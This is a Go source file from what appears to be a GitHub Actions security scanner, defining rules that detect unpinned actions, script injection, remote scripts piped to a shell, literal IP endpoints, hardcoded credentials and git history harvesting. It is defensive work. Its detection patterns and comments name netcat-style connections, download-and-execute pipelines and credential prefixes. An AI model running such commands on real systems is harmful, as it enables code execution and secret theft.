package rules

import (
	"fmt"
	"regexp"
	"sort"
	"strings"

	"github.com/Vibrouz/whoa/internal/findings"
	"github.com/Vibrouz/whoa/internal/parse"
)

// This file holds the PPE rules, in rule number order. One file rather than one
// per rule: the rules are
// independent by design and a reader looking for one wants to see it next to
// its neighbours, not hunt through a directory of small files. What earns a
// separate file is not "a rule" but "something that is not a pure function over
// one parsed workflow", and none of these are.
//
// Every rule is func(*parse.File) findings.Findings. None of them call each
// other, none of them touch I/O, and none of them keep state.

// ---------------------------------------------------------------- rule 1

// Rule 1: uses: pinned to something mutable instead of a commit SHA.

// Rule1ID is the rule identifier for rule 1.
const Rule1ID = "PPE-001"

const (
	lockfilesDocURL = "https://docs.github.com/en/actions/concepts/security/workflow-dependency-lockfiles"
	tjActionsCVEURL = "https://nvd.nist.gov/vuln/detail/cve-2025-30066"
)

var (
	// commitSHA is a full git object name, which is what pinning means.
	commitSHA = regexp.MustCompile(`^[0-9a-fA-F]{40}$`)
	// abbreviatedSHA is enough to resolve today and can be extended to a
	// different commit tomorrow, so it is not a pin.
	abbreviatedSHA = regexp.MustCompile(`^[0-9a-fA-F]{7,39}$`)
	// versionTag is v4, v4.1.2, 4.1.2, 1.0.0-rc1.
	versionTag = regexp.MustCompile(`^v?\d+(\.\d+)*(-[0-9A-Za-z.-]+)?$`)
)

// Rule1 reports uses: references pinned to something mutable rather than to a
// commit SHA.
//
// Block. Most repositories still pin by tag, so this fires on a large share of
// real workflows, and the temptation is to demote it. The reason not to: the
// reference is the only thing standing between an approved change and
// attacker-controlled code at run time, which is the entire job of this gate. A
// tag that moves is indistinguishable, at run time, from a tag the maintainer
// approved.
func Rule1(file *parse.File) findings.Findings {
	var out findings.Findings
	for _, site := range allUses(file) {
		if !rule1Applies(site.ref) {
			continue
		}
		repo, _, ref := site.ref.Parts()
		out = append(out, findings.New(Rule1ID, findings.SeverityBlock, rule1Message(site.ref, repo, ref), site.location(file)))
	}
	return out
}

// rule1Applies decides whether a reference is this rule's business, and the
// test is whether there is a ref that could move.
//
// A reference with no ref is not this rule's problem: it is a workflow that does
// not run, which is a different thing from one that runs unreviewed code. That
// single case is also what excludes the two shapes that have no remote ref to
// pin, since parse reports no ref for either. A local action cannot be
// repointed without changing this repository, and a container reference is a
// different supply chain with different controls, so flagging docker:// would
// fire on a very common pattern for a risk this rule does not cover.
func rule1Applies(uses parse.UsesRef) bool {
	_, _, ref := uses.Parts()
	return ref != "" && !commitSHA.MatchString(ref)
}

// rule1Message leads with workflow dependency lockfiles, because GitHub
// documents them as the strongest control here and as superseding SHA pinning.
// SHA pinning is the fallback for a repository that cannot adopt one, and
// saying it the other way round would be recommending the weaker control.
func rule1Message(uses parse.UsesRef, repo, ref string) string {
	return fmt.Sprintf(
		"%s is pinned to %s. A tag or a branch can be repointed at different code after this change is "+
			"approved, so what runs is not necessarily what was reviewed. GitHub documents workflow "+
			"dependency lockfiles as the strongest control here, and as superseding SHA pinning: a lockfile "+
			"records the exact commit for every action a workflow uses and verifies it at run time (%s). "+
			"Without one, pinning %s to a full 40 character commit SHA is the documented fallback. This is "+
			"what tj-actions/changed-files did in practice: CVE-2025-30066 affected more than 23,000 "+
			"repositories (%s).",
		uses.Target, refKind(ref), lockfilesDocURL, repo, tjActionsCVEURL,
	)
}

// refKind names what sort of mutable reference this is, so the finding says
// what to change rather than only that something is wrong.
func refKind(ref string) string {
	switch {
	case abbreviatedSHA.MatchString(ref):
		return "an abbreviated commit SHA, which can be extended into a different commit"
	case versionTag.MatchString(ref):
		return "a version tag, which can be moved to point at new code"
	default:
		return "a branch or other mutable reference"
	}
}

// ---------------------------------------------------------------- rule 2

// Rule 2: untrusted context interpolated into a run: block.

// Rule2ID is the rule identifier for rule 2.
const Rule2ID = "PPE-002"

// untrustedSuffixes is GitHub's published list of context properties an attacker
// can put content into, verified verbatim against the script injection docs.
//
// Matching the suffix shape rather than enumerating full paths is deliberate: an
// enumeration misses fields, and GitHub adds more events over time. The set is a
// suffix set, not a path set, because `body` is untrusted whether it is reached
// as github.event.issue.body or github.event.pull_request.body, and a rule that
// knew only one of those would miss the other.
var untrustedSuffixes = map[string]bool{
	"body":           true,
	"default_branch": true,
	"email":          true,
	"head_ref":       true,
	"label":          true,
	"message":        true,
	"name":           true,
	"page_name":      true,
	"ref":            true,
	"title":          true,
}

// blockTierSuffixes are the suffixes a fork pull request can reach with no
// privileges at all, which is what makes them Block.
var blockTierSuffixes = map[string]bool{
	"title":   true,
	"body":    true,
	"message": true,
	"email":   true,
}

// heldAtWarnSuffixes would otherwise be Block tier, but ship as Warn until their
// false positive rate is measured against real repositories.
//
// `name` belongs in this tier. It is the widest of the ten suffixes, and
// blocking on an unmeasured suffix is the one way this rule could cost us the
// gate. It is named explicitly here rather than left to the Warn fallback, so
// that deleting the entry visibly promotes it to Block and the change is caught
// rather than silent. To reverse it, delete the entry.
var heldAtWarnSuffixes = map[string]bool{
	"name": true,
}

// writeGatedContexts end in a Block tier suffix but cannot be reached by a fork
// pull request, because creating a release, a milestone or a project already
// requires write access. Reporting them as Block would be a false positive on
// every repository that publishes releases.
var writeGatedContexts = map[string]bool{
	"github.event.release.name":               true,
	"github.event.milestone.title":            true,
	"github.event.project.name":               true,
	"github.event.workflow_run.display_title": true,
}

// githubContext matches a reference to the github context inside an expression,
// capturing the dotted path that follows it.
//
// The path handles both shapes GitHub uses: github.head_ref, where the property
// follows the context directly, and github.event.issue.title, where several
// segments come first. The obvious spelling for this,
// `github\.(event\.)?\w+[.\w]*\.(suffix)`, requires a dot before the suffix
// and so never matches github.head_ref or github.ref, the most common ref-suffix
// references there are. The path is captured and its final segment compared
// instead. The [n] alternation is for list contexts such as
// github.event.commits[0].message and github.event.pages[0].page_name.
var githubContext = regexp.MustCompile(`github((?:\.[A-Za-z0-9_-]+|\[[0-9]+\])+)`)

// Rule2 reports untrusted context interpolated into a run: block.
//
// GitHub substitutes expressions into the script before the shell sees it, so a
// pull request title containing a quote and a semicolon becomes commands rather
// than text. A fork pull request is enough to try it, which is why the freetext
// suffixes block.
//
// Rule 2 reads run: blocks only, on purpose. A value in a step with: or in an
// env: block is not shell text, and GitHub documents passing it through an
// environment variable as the mitigation for this attack. Scanning env: would
// flag the recommended fix.
func Rule2(file *parse.File) findings.Findings {
	var out findings.Findings
	for _, site := range allRunScripts(file) {
		for _, ref := range untrustedReferences(site.script) {
			// The location is the line the match is on, not the line the run:
			// key is on. In a block scalar those differ by however deep into
			// the script the match sits, and a finding that always points at
			// the top of the script is not actionable.
			loc := site.location(file)
			loc.Line = site.lineAt(ref.offset)
			out = append(out, findings.New(Rule2ID, ref.severity, rule2Message(ref), loc))
		}
	}
	return out
}

// untrustedReference is one untrusted context reference found in a script.
type untrustedReference struct {
	// expression is the full text as written, for the message.
	expression string
	// suffix is the final path segment, which is what the tier is decided by.
	suffix string
	// severity is resolved from the context and the suffix.
	severity findings.Severity
	// offset is where the expression starts in the script, so the finding can
	// be placed on the line the match is actually on.
	offset int
}

// untrustedReferences finds every untrusted context reference in a script.
//
// The suffix has to be the whole final segment. That is what keeps
// github.event.pull_request.number from matching, and what keeps a path ending
// in full_name from matching on `name`, so the segment is compared rather than
// substring searched.
func untrustedReferences(script string) []untrustedReference {
	var out []untrustedReference
	for _, loc := range githubContext.FindAllStringSubmatchIndex(script, -1) {
		path := script[loc[2]:loc[3]]
		suffix := path[strings.LastIndex(path, ".")+1:]
		if !untrustedSuffixes[suffix] {
			continue
		}
		expression := script[loc[0]:loc[1]]
		out = append(out, untrustedReference{
			expression: expression,
			suffix:     suffix,
			severity:   rule2Severity(expression, suffix),
			offset:     loc[0],
		})
	}
	return out
}

// rule2Severity decides the tier for one reference.
//
// The split is privilege, not safety. Both tiers are injectable; the difference
// is who can reach the input. A pull request title needs nothing but the ability
// to open a fork pull request. A ref needs push access to create the branch,
// which is a higher bar but not a safe one, since GitHub documents branch names
// as an injection vector in their own right.
func rule2Severity(expression, suffix string) findings.Severity {
	// Write gated first: it can demote a suffix that would otherwise block.
	if writeGatedContexts[expression] {
		return findings.SeverityWarn
	}
	if heldAtWarnSuffixes[suffix] {
		return findings.SeverityWarn
	}
	if blockTierSuffixes[suffix] {
		return findings.SeverityBlock
	}
	return findings.SeverityWarn
}

func rule2Message(ref untrustedReference) string {
	why := "Anyone who can open a pull request on this repository controls this value, so the script below runs as them."
	if ref.severity != findings.SeverityBlock {
		why = "Creating the input for this needs push access, which is a higher bar than a fork pull request but is not " +
			"safe: branch names and similar values can contain quotes and shell metacharacters."
	}
	return fmt.Sprintf(
		"%s is untrusted input interpolated into a shell script. GitHub substitutes expressions into the script "+
			"before the shell runs it, so a value containing a quote and a semicolon becomes commands rather than "+
			"text. %s Pass the value through an environment variable instead: set it under env: and use the "+
			"variable with quotes in the script, which keeps it out of the generated script.",
		ref.expression, why,
	)
}

// ---------------------------------------------------------------- rule 3

// Rule 3: remote script execution.

// Rule3ID is the rule identifier for rule 3.
const Rule3ID = "PPE-003"

// Rule3 reports a run: block that pipes a downloaded script straight into an
// interpreter.
//
// Block. This is the dropper: the script that runs is whatever the server
// returns at that moment, so it is not the script anyone reviewed and it can
// change after review. It is also the one shape in this batch with no false
// positive worth worrying about. Nobody pipes a remote URL into bash on
// purpose, and when they do it is not because the shell resolves it locally.
func Rule3(file *parse.File) findings.Findings {
	var out findings.Findings
	for _, site := range allRunScripts(file) {
		for _, match := range remoteScriptMatches(site.script) {
			loc := site.location(file)
			loc.Line = site.lineAt(match.offset)
			out = append(out, findings.New(Rule3ID, findings.SeverityBlock, rule3Message(match), loc))
		}
	}
	return out
}

// remoteScriptMatch is one remote-script-exec hit.
type remoteScriptMatch struct {
	expression string
	offset     int
}

// downloaderToInterpreter matches a download piped into an interpreter.
//
// Three things about this pattern, each one a way a plausible version misses a
// real dropper:
//
//   - [^|] crosses newlines. A shell line continuation splits the pipeline
//     across lines, as in `wget -qO- https://host/x.sh \\` then newline then
//     `| sudo sh`, and a pattern that stops at a newline sees no pipe at all.
//   - The trailing \b on the interpreter matters. Without it `sh` also matches
//     the start of `sha256sum`, and `| sha256sum -c -` would be reported as
//     remote code execution.
//   - sudo is optional and sits between the pipe and the interpreter, because
//     that is how the dropper is usually written.
var downloaderToInterpreter = regexp.MustCompile(
	`(?i)\b(?:curl|wget|iwr|Invoke-WebRequest)\b[^|]*\|\s*(?:sudo\s+)?(?:(?:ba|z|k)?sh\b|iex\b)`)

func remoteScriptMatches(script string) []remoteScriptMatch {
	var out []remoteScriptMatch
	for _, loc := range downloaderToInterpreter.FindAllStringIndex(script, -1) {
		out = append(out, remoteScriptMatch{
			expression: script[loc[0]:loc[1]],
			offset:     loc[0],
		})
	}
	return out
}

func rule3Message(match remoteScriptMatch) string {
	return fmt.Sprintf(
		"%q downloads a script and pipes it straight into an interpreter. The code that runs is whatever the "+
			"server returns at that moment, so it is not the code that was reviewed and it can change after "+
			"review. This is the shape almost every pipeline dropper takes. Download to a file, read it, then "+
			"execute the file you just wrote, so the content that runs is visible in the workflow file.",
		match.expression,
	)
}

// ---------------------------------------------------------------- rule 4

// Rule 4: a bare IP or an http:// literal in a run: block.

// Rule4ID is the rule identifier for rule 4.
const Rule4ID = "PPE-004"

// Rule4 reports a run: block that reaches a literal address instead of a named
// host.
//
// Block. A named host is something a repository can point somewhere and review
// again later; an IP literal cannot be changed without editing the workflow, and
// it is what an exfiltration endpoint looks like when it wants to avoid a
// hostname it would have to register.
//
// The risk is the *destination*, not the protocol. http:// is included because
// plaintext is how secrets get read off a connection by anything on the path,
// but it is a Warn on its own: plenty of legitimate internal endpoints are
// plain http, and a separate finding for them would be noise.
func Rule4(file *parse.File) findings.Findings {
	var out findings.Findings
	for _, site := range allRunScripts(file) {
		for _, match := range literalEndpointMatches(site.script) {
			loc := site.location(file)
			loc.Line = site.lineAt(match.offset)
			sev := findings.SeverityBlock
			if match.kind == endpointHTTP || match.kind == endpointIPInPath {
				sev = findings.SeverityWarn
			}
			out = append(out, findings.New(Rule4ID, sev, rule4Message(match), loc))
		}
	}
	return out
}

type endpointKind int

const (
	// endpointIP is a bare address something is going to connect to: a URL host,
	// or an address beside a network command. Block.
	endpointIP endpointKind = iota
	// endpointIPInPath is a dotted quad inside the path of a URL. It is usually
	// a version, so it is Warn and not Block.
	endpointIPInPath
	// endpointHTTP is a plain http:// URL to any host. Warn: it is a real risk,
	// but a plaintext internal endpoint is often legitimate.
	endpointHTTP
)

type endpointMatch struct {
	kind       endpointKind
	expression string
	offset     int
}

// ipv4Literal matches a dotted quad: four octets in 0 to 255.
//
// A four part version string and an IPv4 address are the same token shape, so
// this pattern on its own cannot tell `-Dversion=1.2.3.4` from `nc 1.2.3.4`.
// networkContext below is what separates them.
var ipv4Literal = regexp.MustCompile(`\b(?:(?:25[0-5]|2[0-4][0-9]|1[0-9]{2}|[1-9]?[0-9])\.){3}(?:25[0-5]|2[0-4][0-9]|1[0-9]{2}|[1-9]?[0-9])\b`)

// httpLiteral matches a plain http:// URL. https is deliberately excluded:
// rule 3 already reports the download-and-execute shape, and here https is the
// ordinary case.
var httpLiteral = regexp.MustCompile(`\bhttp://[^\s"'<>|)\]\` + "`" + `]+`)

// networkCommand matches a command whose business is talking to a host.
//
// This is the context that separates an endpoint from a version string. A bare
// IP only means something to rule 4 when something is going to connect to it,
// and `nc 1.2.3.4 4444` and `./gradlew build -Dversion=1.2.3.4` are the same
// token on the same line in different intents.
//
// The list is the common ones rather than an exhaustive one. A missed command
// costs a false negative on one shape of rule 4; a wrong entry costs a false
// positive on a Block tier rule, which is the more expensive direction, so
// entries are added only when they are unambiguous.
var networkCommand = regexp.MustCompile(
	`(?i)\b(?:curl|wget|iwr|invoke-webrequest|nc|ncat|netcat|telnet|ssh|scp|sftp|rsync|ping|dig|nslookup|host|ftp|ftps?|socat|nc\.openbsd)\b`)

// literalEndpointMatches finds literal endpoints in a script.
//
// A bare IP is only reported when something on the line is going to connect to
// it: a network command, or the IP being a URL's host. That is the fix for the
// false positive that matters here, because four part version strings are
// everywhere in Java and Gradle builds and a Block tier rule that fires on
// `-Dversion=1.2.3.4` would block legitimate repositories, and a gate that does
// that gets disabled, which costs us the rules that matter.
//
// An IP in a URL *path* is reported too, at Warn. It is usually a version, so it
// does not block, but it is not nothing either: an attacker who wants rule 4 to
// stay quiet has exactly one move available, which is to put a dotted quad in
// the path of the URL, and that should leave a trace rather than no finding.
// The trade is a Warn on legitimate versioned download URLs, which is the right
// side of it: Warn annotates and does not block.
func literalEndpointMatches(script string) []endpointMatch {
	var out []endpointMatch

	for _, line := range scriptLines(script) {
		text, offset := line.text, line.offset
		hasNetworkCommand := networkCommand.MatchString(text)
		spans := urlSpans(text)

		for _, loc := range ipv4Literal.FindAllStringIndex(text, -1) {
			match := endpointMatch{
				expression: text[loc[0]:loc[1]],
				offset:     offset + loc[0],
			}
			switch placeIP(spans, loc[0]) {
			case ipURLHost:
				// The scheme is the network context, so no command needed.
				match.kind = endpointIP
			case ipURLPath:
				if !hasNetworkCommand {
					continue
				}
				match.kind = endpointIPInPath
			default:
				if !hasNetworkCommand {
					continue
				}
				// Two ways a bare address is data rather than a destination.
				// Both were found by looking at real workflows rather than by
				// imagining them, and both would otherwise block a repository.
				if isLoopback(match.expression) || isIPPayload(text, loc[0]) {
					continue
				}
				match.kind = endpointIP
			}
			out = append(out, match)
		}

		for _, loc := range httpLiteral.FindAllStringIndex(text, -1) {
			out = append(out, endpointMatch{
				kind:       endpointHTTP,
				expression: text[loc[0]:loc[1]],
				offset:     offset + loc[0],
			})
		}
	}

	// Sorted by offset so findings come out in script order rather than all the
	// IPs followed by all the URLs.
	sort.Slice(out, func(i, j int) bool { return out[i].offset < out[j].offset })
	return out
}

// scriptLine is one line of a script with its offset in the whole script.
type scriptLine struct {
	text   string
	offset int
}

// scriptLines splits a script into lines, remembering where each one starts so
// a match offset can be mapped back to the file.
func scriptLines(script string) []scriptLine {
	var lines []scriptLine
	start := 0
	for i := 0; i <= len(script); i++ {
		if i == len(script) || script[i] == '\n' {
			lines = append(lines, scriptLine{text: script[start:i], offset: start})
			start = i + 1
		}
	}
	return lines
}

// anyURL matches http and https URLs. Used to work out where an address sits
// inside a URL, so it has to cover https as well as the http that
// httpLiteral reports on.
var anyURL = regexp.MustCompile(`\bhttps?://[^\s"'<>|)\]` + "`" + `]+`)

// urlSpan is one URL in a line: the byte range it occupies, and where its path
// begins. pathOffset is -1 when the URL has no path, as in http://1.2.3.4.
type urlSpan struct {
	start, end int
	pathOffset int
}

// urlSpans finds the URLs in a line.
//
// The URLs are located rather than reconstructed from a backwards search for
// "://" because a backwards search cannot tell an address inside a path from an
// address that merely follows a URL. In `curl http://host/x 1.2.3.4`, the
// 1.2.3.4 is a second argument to curl and nothing to do with the path, and a
// backwards search reads it as path.
func urlSpans(line string) []urlSpan {
	var spans []urlSpan
	for _, loc := range anyURL.FindAllStringIndex(line, -1) {
		span := urlSpan{start: loc[0], end: loc[1], pathOffset: -1}
		// The path starts at the first /, ? or # after the scheme and the host.
		// The scheme's own slashes have to be skipped, or every URL looks like
		// it has a path starting inside "://" and every host reads as a path.
		host := line[loc[0]:loc[1]]
		if colon := strings.Index(host, "://"); colon >= 0 {
			if at := strings.IndexAny(host[colon+3:], "/?#"); at >= 0 {
				span.pathOffset = loc[0] + colon + 3 + at
			}
		}
		spans = append(spans, span)
	}
	return spans
}

// ipPlacement is where an address sits relative to any URL on its line.
type ipPlacement int

const (
	// ipStandalone is an address that is not part of a URL at all.
	ipStandalone ipPlacement = iota
	// ipURLHost is the host: curl http://1.2.3.4/x
	ipURLHost
	// ipURLPath is after the first slash of a URL: curl https://host/1.2.3.4/x
	ipURLPath
)

func placeIP(spans []urlSpan, offset int) ipPlacement {
	for _, span := range spans {
		if offset < span.start || offset >= span.end {
			continue
		}
		if span.pathOffset < 0 || offset < span.pathOffset {
			return ipURLHost
		}
		return ipURLPath
	}
	return ipStandalone
}

// isLoopback reports whether an address is in 127.0.0.0/8.
//
// curl's own documentation gives `curl --resolve example.com:80:127.0.0.1
// http://example.com/` as the way to test a virtual host locally, and every
// suite that exercises SNI or vhost routing writes that line. Nothing leaves the
// machine through 127.0.0.1, so an exfiltration endpoint there is not a thing.
//
// RFC1918 is deliberately NOT exempt. Private space is where exfiltration goes,
// and 10.x is what an internal collector is usually reached at.
func isLoopback(address string) bool {
	return strings.HasPrefix(address, "127.")
}

// isIPPayload reports whether an address at an offset is data being sent or
// configured, rather than a destination being connected to.
//
// Managing addresses over an HTTP API is a whole category of tooling: DNS
// providers, fail2ban and CrowdSec wrappers, allowlist editors. In every one of
// them the presence of a dotted quad beside a curl is the entire point of the
// command, and an earlier version of this rule blocked all of them.
//
// The signal is the flag that owns the argument, not the quoting. An address is
// data when it sits in the argument of a flag that sends a body or a header:
//
//	curl -X POST https://api.porkbun.com/api/json/v3/dns/create/example.com \
//	  -d '{"type":"A","content":"1.2.3.4"}'
//	curl -X POST http://localhost:8080/api/ip/unban -d '{"ip": "1.2.3.4"}'
//	curl -X POST https://telemetry.example.com/ingest -H "X-Version: 1.2.3.4"
//
// or when it follows an = in the same argument, as in -d "version=1.2.3.4".
//
// Quoting alone is deliberately NOT the signal, and an earlier version treated
// it as one. `nc "198.51.100.42" 4444` and `rsync -a file "10.0.0.5:/tmp/"` are
// ordinary shell, and reading them as payload would have handed an attacker a
// one-character bypass of a Block rule. The flag is what separates them.
//
// Only consulted for an address that is not in URL position, so `curl
// "http://1.2.3.4/x"` is already a URL host before this is reached.
func isIPPayload(text string, offset int) bool {
	// The easy half: the address sits directly behind an equals sign.
	if strings.HasSuffix(text[:offset], "=") {
		return true
	}
	open := openingQuoteIndex(text, offset)
	if open < 0 {
		// Not quoted and not behind an =. That is a bare token, so it is a
		// destination or it is nothing.
		return false
	}
	return isDataFlagArgument(text, open)
}

// isDataFlagArgument reports whether the quoted word opening at an index is the
// argument of a flag that sends a body, a header or similar.
func isDataFlagArgument(text string, open int) bool {
	head := strings.Fields(text[:open])
	if len(head) == 0 {
		return false
	}
	// The word before the quote is either the flag itself, or a name= attached
	// to one, as in mailcow's `-d attr='{"whitelist":"1.2.3.4"}'`.
	for _, word := range head {
		if isDataFlag(word) {
			return true
		}
	}
	// A JSON object as the argument: {"ip":"1.2.3.4"}. The brace has to be in
	// this word, not earlier on the line, so the shell -c '{ ... }' case does
	// not sweep up an unrelated address.
	return strings.Contains(head[len(head)-1], "{")
}

// isDataFlag reports whether a word is a flag whose argument is a body, a
// header or similar.
func isDataFlag(word string) bool {
	// Strip an attached name=, as in attr= for a `-d attr=` style.
	if eq := strings.IndexByte(word, '='); eq >= 0 {
		word = word[:eq]
	}
	switch word {
	case "-d", "--data", "--data-raw", "--data-binary", "--data-urlencode",
		"-H", "--header", "-F", "--form", "--form-string",
		"-b", "--cookie", "-A", "--user-agent", "-e", "--referer", "-w", "--write-out",
		"-X", "--request":
		return true
	}
	return false
}

// openingQuoteIndex returns the index of the innermost quote that is still open
// at an offset, or -1 when the offset is not inside quotes.
func openingQuoteIndex(text string, offset int) int {
	// A stack of (index, quote character) pairs. Tracking the index as well as
	// the character is what makes the innermost quote findable at all: a stack
	// of characters can say which quote is open but not where it was.
	type openQuote struct {
		at    int
		quote byte
	}
	var stack []openQuote

	for i := 0; i < offset && i < len(text); i++ {
		c := text[i]
		if len(stack) > 0 {
			top := stack[len(stack)-1]
			// A backslash escapes the next character inside double quotes only.
			// Inside single quotes a backslash is an ordinary character, which
			// is POSIX behaviour.
			if c == '\\' && top.quote == '"' && i+1 < len(text) {
				i++
				continue
			}
			if c == top.quote {
				stack = stack[:len(stack)-1]
				continue
			}
		}
		if c == '\'' || c == '"' {
			// A quote of the other kind inside an open string is literal in the
			// shell, but pushing it anyway is what lets the innermost quote be
			// found in `curl -d '{"ip":"1.2.3.4"}'`, where the JSON quotes all
			// sit inside the shell's single quotes. Treating them as data instead
			// hides the value's own quote, which is the one a field check needs.
			//
			// This cannot manufacture a false negative on its own, because
			// being inside quotes is not what makes an address data. The flag in
			// front of the argument is, and that check is unchanged.
			stack = append(stack, openQuote{at: i, quote: c})
		}
	}
	if len(stack) == 0 {
		return -1
	}
	return stack[len(stack)-1].at
}

func rule4Message(match endpointMatch) string {
	switch match.kind {
	case endpointHTTP:
		return fmt.Sprintf(
			"%s is a plain http:// address in a script. Anything sent to it, including a token or a secret read "+
				"from the environment, travels in the clear and can be read by anything on the path. If this is an "+
				"internal endpoint that genuinely cannot serve https, say so in a comment, otherwise use https.",
			match.expression,
		)
	case endpointIPInPath:
		return fmt.Sprintf(
			"%s is an IP address in the path or query of a URL that this script fetches. This is usually a "+
				"version number and this finding is a warning rather than a block for that reason. It is "+
				"reported anyway because an address there is the one place to hide an address from a scanner "+
				"that looks at URL hosts, and that is worth a human glance. If it really is a version, it "+
				"belongs in a variable named like one.",
			match.expression,
		)
	}
	return fmt.Sprintf(
		"%s is a bare IP address in a script. A named host is something a repository can repoint and review "+
			"again later; an IP literal cannot be changed without editing the workflow, and it is what an "+
			"exfiltration endpoint looks like when it would rather not register a hostname. This is one of the "+
			"signatures in the GhostAction fingerprint: a workflow that reaches a literal address is reaching "+
			"somewhere nobody chose to name.",
		match.expression,
	)
}

// ---------------------------------------------------------------- rule 5

// Rule 5: a credential pattern in a run: block.

// Rule5ID is the rule identifier for rule 5.
const Rule5ID = "PPE-005"

// credentialPatterns are the credential shapes from the GhostAction report,
// kept as named patterns so the message can say which one matched.
//
// Each is a real credential prefix, not a bare word. AKIA alone would match a
// variable called AKIA_REGION, and sk- alone would match any hyphenated word
// starting with sk.
var credentialPatterns = []struct {
	name  string
	regex *regexp.Regexp
}{
	{"AWS access key id", regexp.MustCompile(`\bAKIA[0-9A-Z]{16}\b`)},
	// A GitHub PAT is exactly 36 characters after the prefix. The trailing \b
	// has to come off: the 36th character is a word character, so \b there never
	// matches and the pattern silently finds nothing.
	{"GitHub personal access token", regexp.MustCompile(`ghp_[A-Za-z0-9]{36}`)},
	{"private key block", regexp.MustCompile(`-----BEGIN [A-Z ]*PRIVATE KEY-----`)},
	{"OpenAI style API key", regexp.MustCompile(`\bsk-[A-Za-z0-9]{20,}\b`)},
	{"Slack token", regexp.MustCompile(`\bxox[baprs]-[A-Za-z0-9-]{10,}\b`)},
}

// Rule5 reports a run: block containing something shaped like a live
// credential.
//
// Block. A workflow file is committed, so a credential in one is a credential in
// the repository's history, and it is a credential in every fork and every
// mirror. Rotation is the only fix once it is committed.
func Rule5(file *parse.File) findings.Findings {
	var out findings.Findings
	for _, site := range allRunScripts(file) {
		for _, match := range credentialMatches(site.script) {
			loc := site.location(file)
			loc.Line = site.lineAt(match.offset)
			out = append(out, findings.New(Rule5ID, findings.SeverityBlock, rule5Message(match), loc))
		}
	}
	return out
}

type credentialMatch struct {
	patternName string
	expression  string
	offset      int
}

func credentialMatches(script string) []credentialMatch {
	var out []credentialMatch
	for _, pattern := range credentialPatterns {
		for _, loc := range pattern.regex.FindAllStringIndex(script, -1) {
			out = append(out, credentialMatch{
				patternName: pattern.name,
				expression:  script[loc[0]:loc[1]],
				offset:      loc[0],
			})
		}
	}
	sort.Slice(out, func(i, j int) bool { return out[i].offset < out[j].offset })
	return out
}

func rule5Message(match credentialMatch) string {
	return fmt.Sprintf(
		"this script contains a %s (%s). A credential written into a workflow file is a credential committed "+
			"to the repository, and it is in the history, in every fork, and in every mirror. It is also in "+
			"the log of every run, because Actions masks secrets it knows about and not secrets it does not. "+
			"Move it to an environment secret and reference it with the secrets context, then rotate this one: "+
			"removing it from the file does not remove it from the history.",
		match.patternName, match.expression,
	)
}

// ---------------------------------------------------------------- rule 6

// Rule 6: a deep checkout and a git history scan in the same job.

// Rule6ID is the rule identifier for rule 6.
const Rule6ID = "PPE-006"

// Rule6 reports a job that both fetches full git history and reads that history
// back out.
//
// Block. fetch-depth: 0 is the unusual thing: nearly every repository checks out
// with the default depth of 1, which gives a job the single commit it needs and
// none of the history behind it. A job that asks for all the history is a job
// that wants what is in it, and a job that then runs git log -p over that
// history is reading secrets that were committed and later rotated.
//
// The correlation is per job, then per file. A fetch-depth: 0 in the build job
// and a git log -p in an unrelated release job is not this: it is two ordinary
// jobs. Correlating across the file would fire on a large share of legitimate
// repositories and this rule blocks.
func Rule6(file *parse.File) findings.Findings {
	var out findings.Findings
	for _, job := range file.Jobs {
		deepCheckout, historyScan := jobHarvestSignals(job)
		if !deepCheckout || !historyScan {
			continue
		}
		out = append(out, findings.New(
			Rule6ID,
			findings.SeverityBlock,
			rule6Message(),
			jobLocation(file, job),
		))
	}
	return out
}

// jobHarvestSignals reports whether a job fetches full history and whether it
// reads that history, as two independent booleans.
//
// Both are needed because either alone is common: full history is needed by a
// release job that computes a changelog, and a history scan is needed by a test
// job that runs git blame on the working tree. Together they are the harvest
// shape.
func jobHarvestSignals(job parse.Job) (deepCheckout, historyScan bool) {
	for _, step := range job.Steps {
		if depth, ok := step.With.Get("fetch-depth"); ok && depth.Text == "0" {
			deepCheckout = true
		}
		if readsHistory(step.Run) {
			historyScan = true
		}
	}
	return deepCheckout, historyScan
}

// The commands that read commit history back out of the repository.
//
// git log needs a patch flag to count. A bare `git log` prints one line per
// commit, which is what a changelog job does and is entirely legitimate; it is
// the patch output that dumps diffs, and a diff contains every secret that was
// ever committed, including ones rotated long ago that still work. That is why
// the three are `git log -p`, `git rev-list` and `git show`.
//
// The patch flag may be grouped, as in -up, and is matched as a short flag group
// containing p rather than as the literal string "-p".
var (
	logWithPatch = regexp.MustCompile(`\bgit\s+log\b(?:\s+\S+)*?\s-(?:[a-zA-Z]*p[a-zA-Z]*)(?:\s|$)|\bgit\s+log\b(?:\s+\S+)*?\s--patch(?:\s|$)`)
	revList      = regexp.MustCompile(`\bgit\s+rev-list\b`)
	show         = regexp.MustCompile(`\bgit\s+show\b`)
)

// readsHistory reports whether a script reads commit history.
//
// The \b before git keeps it from matching inside a path like /usr/bin/gitlog,
// which is a real trap in a matcher written for a whole file rather than one
// script.
func readsHistory(script string) bool {
	return logWithPatch.MatchString(script) || revList.MatchString(script) || show.MatchString(script)
}

func rule6Message() string {
	return "this job checks out with fetch-depth: 0 and then reads the commit history back out with git log, " +
		"git rev-list, or git show. Nearly every repository checks out with the default depth of 1, which gives " +
		"a job the single commit it needs and none of the history behind it, so asking for all of it is the " +
		"unusual half of this. Reading that history is the other half: a diff contains every secret that was " +
		"ever committed to this repository, including ones that were rotated long ago and are still perfectly " +
		"usable. This is the harvest shape in the GhostAction fingerprint. If you need the history, fetch it " +
		"explicitly for one command and throw it away afterwards, rather than checking out all of it."
}

// ---------------------------------------------------------------- rule 7

// Rule 7: on: push with no ref or path filter.

// Rule7ID is the rule identifier for rule 7.
const Rule7ID = "PPE-007"

// Rule7 reports a workflow that runs on every push to any branch.
//
// Warn, because an unfiltered push is extremely common and legitimate: many
// repositories deliberately build every branch. Blocking it would be noise, and
// a noisy gate gets disabled, which costs us the rules that matter.
//
// It is one of the five components of the GhostAction fingerprint composite
// (rules 4 through 8). It cannot trigger that composite on its own, because it
// fires on far too many real workflows to mean anything by itself.
func Rule7(file *parse.File) findings.Findings {
	push, ok := file.Triggers.Spec("push")
	if !ok || !push.Unfiltered() {
		return nil
	}
	return findings.Findings{
		findings.New(Rule7ID, findings.SeverityWarn, rule7Message(), findings.At(file.Path, push.Line)),
	}
}

func rule7Message() string {
	// No incident figure is quoted here on purpose. The counts published for
	// GhostAction are vendor-sourced and unconfirmed, and a figure that reaches a
	// user needs a primary source. The mechanism is what matters here and it is
	// not in doubt: a stolen maintainer token pushes to the default branch and
	// the workflow runs.
	return "on: push has no branches, tags or paths filter, so this workflow runs for every commit that " +
